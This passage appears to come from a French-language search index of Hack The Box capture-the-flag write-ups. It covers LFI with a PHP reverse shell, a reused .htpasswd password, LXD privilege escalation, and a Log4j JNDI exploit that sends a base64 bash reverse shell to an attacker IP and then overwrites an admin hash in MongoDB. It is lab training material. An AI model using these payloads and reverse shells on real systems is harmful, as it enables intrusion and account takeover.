0&gt;&amp;1'\");?&gt;\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 </code></pre> <p>On doit connaitre l'emplacement ou le fichier a \u00e9t\u00e9 upload\u00e9 avant de l'executer grace au LFI.</p> <p>\u276f curl 'http://10.129.102.34/?file=/var/lib/tftpboot/reverse.php'</p> <p>On entre en tant que www-data.</p> <p>Le shell re\u00e7u n'est pas compl\u00e8tement interactif alors on l\u2019am\u00e9liore un peu :</p> <pre><code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre> <p>On entre avec le compte www-data</p>"},{"location":"tiers2/included/#mouvement-lateral","title":"Mouvement Lateral","text":"<p>Avec le compte www-data nous n'avons pas le droit de faire grand chose. On commence a \u00e9num\u00e9rer, nous regardons donc dans le dossier web pour voir si on trouve des identifiants, voir mieux.</p> <pre><code>www-data@included:/var/www/html$ cat .htpasswd\ncat .htpasswd\nmike:Sheffield19\nwww-data@included:/var/www/html$ </code></pre> <p>On trouve quelque chose qui ressemble a un pass avec le nom d'user d\u00e9j\u00e0 rencontr\u00e9 dans le /etc/passwd mike:Sheffield19</p> <pre><code>www-data@included:/var/www/html$ su mike su mike\nPassword: Sheffield19\n\nmike@included:/var/www/html$ cd /home/mike\ncd /home/mike\nmike@included:~$ ls\nls\nuser.txt\nmike@included:~$ cat user   cat user.txt a56ef91d70cfbf2cdb8f45..........\n</code></pre> <p>Nous avons le premier flag.</p> <p> </p>"},{"location":"tiers2/included/#escalade-de-privileges","title":"Escalade de privil\u00e8ges","text":"<p>Nous allons utiliser l'application LXC Distribution Builder.  </p> <p>What is LXD? ; Howto</p> <p>LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to match the permissions of the calling user to the function it is asked to perform.  </p> <p>On cherche une vuln avec et on trouve : </p> <p>A member of the local \u201clxd\u201d group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.</p> <p>Pour l'install de distrobuilder il faut prendre la derni\u00e8re version de go ! , sinon t'as une erreur avec make.</p> <ol> <li>T\u00e9l\u00e9charger go1.20.4.linux-amd64.tar.gz dans /usr/local/go puis :</li> </ol> <pre><code>$ rm -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.20.4.linux-amd64.tar.gz\n</code></pre> <ol> <li>D\u00e9sinstaller la version 1.17 qui viens avec parrot et prendre la 20.</li> </ol> <pre><code>\u276f sudo su\n[sudo] Mot de passe de rnek0\u00a0: \u276f rm -r /usr/lib/go-1.17\n\u276f ls /usr/lib/go-1.17\nlsd: /usr/lib/go-1.17: No such file or directory (os error 2).\n</code></pre> <p>Ajouter a la var d'environnement.</p> <pre><code>\u276f go env\nzsh: command not found: go\n\u276f export PATH=$PATH:/usr/local/go/bin\n\u276f go env\nGO111MODULE=\"\"\nGOARCH=\"amd64\"\nGOBIN=\"\"\n...\n</code></pre> <p>Puis pour que cela soit persistent</p> <p>export PATH=$PATH:/usr/local/go/bin dans le .profile</p> <p>Une fois cela fait tu peux installer distrobuilder, tu clones et tu fais un simple make dans le dossier.</p> <pre><code>git clone https://github.com/lxc/distrobuilder\ncd distrobuilder\nmake\n</code></pre> <p>After the build is complete let's download the Alpine YAML file and build it... que estoy hasta las narizes de traducir !</p> <p>CUIDADITO ! Aqui el Write-up dice que la version es 3.8 pero no esta al dia, mira en https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml en el campo same_as para saber cual es el numero de version.</p> <pre><code>mkdir -p $HOME/ContainerImages/alpine/\ncd $HOME/ContainerImages/alpine/\nwget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml\nsudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.12\n</code></pre> <p>Despues de esto tenemos dos ficheros llamados lxd.tar.xz y rootfs.squashfs que han sido creados en el folder.</p> <p>Nous devrons maintenant transf\u00e9rer ces fichiers vers le syst\u00e8me cible via l'utilisation d'un serveur HTTP Python. Ex\u00e9cutez la commande suivante localement sur le m\u00eame dossier.</p> <pre><code>python3 -m http.server 8000\n</code></pre> <p>Revenez ensuite au shell invers\u00e9 sur le syst\u00e8me cible et t\u00e9l\u00e9chargez les fichiers.</p> <pre><code>wget http://10.10.15.253:8000/lxd.tar.xz\nwget http://10.10.15.253:8000/rootfs.squashfs\n</code></pre> <p></p> <p>Apr\u00e8s \u00eatre entr\u00e9 en root je me suis fait \u00e9jecter juste avant de r\u00e9cup\u00e9rer le flag ! donc il a fallu revenir refaire le mouvement lateral puis heureusement que le container \u00e9tait en train de tourner donc du coup je suis entr\u00e9 et j'ai pris le flag.</p> <p>Pwned</p> up \u2191"},{"location":"tiers2/oopsie/","title":"Oopsie","text":""},{"location":"tiers2/unified/","title":"Unified","text":"<p> Linux</p> <p>Cette machine est int\u00e9ressante vu que Log4j a surpris tout le monde, \u00e9tant donn\u00e9 que c'est une faille qui est la depuis un bon moment et elle n'a \u00e9t\u00e9 d\u00e9couverte que r\u00e9cemment.  Elle a m\u00eame permis de prendre conscience sur le fait qu'un seul d\u00e9veloppeur \u00e0 la charge d'un projet et qui fait ce code de fa\u00e7on b\u00e9n\u00e9vole pouvait \u00eatre \u00e0 la base d'une faille de grosse ampleur. CVE-2021-44228</p>"},{"location":"tiers2/unified/#on-teste-la-vulnerabilite","title":"On teste la vulnerabilit\u00e9","text":"<p>On se sert du champ 'remember' avec le 'repeater de burpsuite' pour y introduire un appel ldap, on est \u00e0 l'\u00e9coute avec tcpdump</p> <p>${jndi:ldap://10.10.14.19/whatever}</p> <pre><code>\u276f tcpdump -i tun0 port 389 -v\ntcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes\n03:18:20.530190 IP (tos 0x0, ttl 63, id 10956, offset 0, flags [DF], proto TCP (6), length 60)\n10.129.125.109.60474 &gt; 10.10.14.19.ldap: Flags [S], cksum 0xf4e8 (correct), seq 339107591, win 64240, options [mss 1360,sackOK,TS val 2396506282 ecr 0,nop,wscale 7], length 0\n03:18:20.530225 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 40)\n10.10.14.19.ldap &gt; 10.129.125.109.60474: Flags [R.], cksum 0xaec7 (correct), seq 0, ack 339107592, win 0, length 0\n</code></pre>"},{"location":"tiers2/unified/#on-construit-lapplication-java-rogue-jndi-avec-maven","title":"On construit l'application java rogue-jndi avec maven","text":"<p>Ici j'ai eu un doute sur la version de java mais cela marche quand m\u00eame avec la version 17 de Parrot. De toutes fa\u00e7ons si tu d\u00e9sinstalles la 17 t'as plus le Burpsuite.</p> <pre><code>git clone https://github.com/veracode-research/rogue-jndi\ncd rogue-jndi\nmvn package\n</code></pre> <p>Nous avons construit :  RogueJndi-1.1.jar</p> <p>On va utiliser cette appli pour cr\u00e9er le payload !</p> <p>Le payload va \u00eatre un reverse shell sous cette forme : </p> <pre><code>\u276f echo 'bash -c bash -i &gt;&amp;/dev/tcp/10.10.14.19/8888 0&gt;&amp;1' | base64\nYmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTkvODg4OCAwPiYxCg==\n</code></pre> <p>Un reverse shell classique.</p> <p>On va donc ex\u00e9cuter RogueJndi-1.1.jar et on va lui passer le payload dans le param\u00e8tre --command et on va mettre le --hostname avec n\u00f4tre tun0</p> <pre><code>\u276f java -jar ./RogueJndi-1.1.jar --command \"bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTkvODg4OCAwPiYxCg==}|{base64,-d}|{bash,-i}\" --hostname \"10.10.14.19\"\n+-+-+-+-+-+-+-+-+-+\n|R|o|g|u|e|J|n|d|i|\n+-+-+-+-+-+-+-+-+-+\nStarting HTTP server on 0.0.0.0:8000\nStarting LDAP server on 0.0.0.0:1389\nMapping ldap://10.10.14.19:1389/o=tomcat to artsploit.controllers.Tomcat\nMapping ldap://10.10.14.19:1389/ to artsploit.controllers.RemoteReference\nMapping ldap://10.10.14.19:1389/o=reference to artsploit.controllers.RemoteReference\nMapping ldap://10.10.14.19:1389/o=websphere2 to artsploit.controllers.WebSphere2\nMapping ldap://10.10.14.19:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2\nMapping ldap://10.10.14.19:1389/o=websphere1 to artsploit.controllers.WebSphere1\nMapping ldap://10.10.14.19:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1\nMapping ldap://10.10.14.19:1389/o=groovy to artsploit.controllers.Groovy\nSending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload\n</code></pre> <p>On va sur Burpsuite et on send dans le 'repeater' avec : </p> <pre><code>{\"username\":\"admin\",\"password\":\"admin\",\"remember\":\"${jndi:ldap://10.10.14.19:1389/o=tomcat}\",\"strict\":true}\n</code></pre>"},{"location":"tiers2/unified/#on-est-a-lecoute-et-on-recois-la-connection","title":"On est \u00e0 l'\u00e9coute et on re\u00e7ois la connection","text":"<pre><code>\u276f nc -lvp 8888\nlistening on [any] 8888 ...\n10.129.125.109: inverse host lookup failed: Unknown host\nconnect to [10.10.14.19] from (UNKNOWN) [10.129.125.109] 50980\nwhoami\nunifi\nscript /dev/null -c bash\nScript started, file is /dev/null\nunifi@unified:/usr/lib/unifi$ </code></pre> <p>pwd et ls /home/${USER} pour aller chercher un user.txt</p>"},{"location":"tiers2/unified/#on-se-connecte-a-mongo-pour-chercher-le-pass-de-ladmin","title":"On se connecte a mongo pour chercher le pass de l'admin","text":"<pre><code>unifi@unified:/home/michael$ mongo --port 27117 ace --eval \"db.admin.find().forEach(printjson);\"\n</code></pre> <p>Une fois trouv\u00e9 on va le remplacer par le notre</p> <ol> <li>On cr\u00e9e le pass en sha-512</li> </ol> <pre><code>mkpasswd -m sha-512 Password1234\n</code></pre> <ol> <li>On le remplace </li> </ol> <pre><code>unifi@unified:/home/michael$ mongo --port 27117 ace --eval 'db.admin.update({\"_id\":ObjectId(\"61ce278f46e0fb0012d47ee4\")},{$set:{\"x_shadow\":\"$6$xpt560mkS9qyXcXx$pif2PENRfHM/5IKuw4qaSbebUCh1dO72I5wZnL4tntxWzJzT7n4bNCwqXD6lY68UMCX6vx.2zpweswuYdBAX6.\"}})'\n&lt;ntxWzJzT7n4bNCwqXD6lY68UMCX6vx.2zpweswuYdBAX6.\"}})'\nMongoDB shell version v3.6.3\nconnecting to: mongodb://127.0.0.1:27117/ace\nMongoDB server version: 3.6.3\nWriteResult({ \"nMatched\" : 1, \"nUpserted\" : 0, \"nModified\" : 1 })\nunifi@unified:/home/michael$ </code></pre> <p>Puis on peut se connecter sur l'interface du site ;)</p> <p>user : administrator pass : Password1234</p> <p>Dans le site on trouve le mot de passe pour root pour une connection ssh !!!</p> <p>On se connecte en ssh et la machine est finie. \\o/</p> <p>Pwned </p> up \u2191"}]}